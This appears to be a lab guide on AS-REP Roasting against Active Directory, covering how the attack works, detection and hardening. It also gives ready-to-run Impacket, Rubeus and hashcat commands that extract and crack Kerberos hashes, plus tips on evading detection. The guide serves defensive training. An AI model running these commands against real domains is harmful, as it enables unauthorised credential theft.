# AS-REP Roasting

Obtain AS-REP for accounts with **Kerberos pre-authentication disabled** and crack offline.

## Objective

Demonstrate credential exposure when `DONT_REQ_PREAUTH` is set on user accounts.

## MITRE ATT&CK

- [T1558.004 – Steal or Forge Kerberos Tickets: AS-REP Roasting](https://attack.mitre.org/techniques/T1558/004/)

## How It Works

1. Attacker enumerates users (LDAP, Kerbrute, username list).
2. For accounts without pre-auth, KDC returns encrypting material in AS-REP.
3. Offline crack yields user password if weak.

## Lab Preconditions

- Lab account `legacyapp` with **Account does not require Kerberos preauthentication** enabled
- Weak password for demonstration
- No MFA (N/A for Kerberos password in classic roast)

## Enable Weak Config (Lab Only)

```powershell
Set-ADAccountControl -Identity legacyapp -DoesNotRequirePreAuth $true
```

**Never** use in production; document removal in hardening phase.

## Execution Examples

### Impacket

```bash
impacket-GetNPUsers corp.lab.local/ -usersfile users.txt -format hashcat -outputfile asrep.txt
```

### Rubeus

```text
Rubeus.exe asreproast /format:hashcat /outfile:asrep_hashes.txt
```

### hashcat

```bash
hashcat -m 18200 asrep_hashes.txt wordlist.txt
```

## Success Criteria

- [ ] Hash retrieved without knowing password (unauthenticated or user enum)
- [ ] Password recovered in lab
- [ ] Detection: Event **4768** with pre-auth type `0` (where logged)
- [ ] Account fixed: pre-auth required

## Detection

[../detection/asrep-detection.md](../detection/asrep-detection.md)

## Hardening

- Ensure **no accounts** have pre-auth disabled except documented break-glass with monitoring
- Azure AD / hybrid: separate from on-prem; this technique targets AD KDC
- Regular audit:

```powershell
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth
```

## Attacker evasion

- Spray usernames slowly to avoid 4625 lockout noise before AS-REP attempt.
- Target only pre-auth-disabled accounts (BloodHound *AS-REP Roastable Users*).

## Comparison to Kerberoasting

| Aspect | Kerberoasting | AS-REP Roasting |
|--------|---------------|-----------------|
| Auth required | Yes (any user) | No for vulnerable accounts |
| Target | Accounts with SPNs | Pre-auth disabled accounts |
| Event focus | 4769 | 4768 |
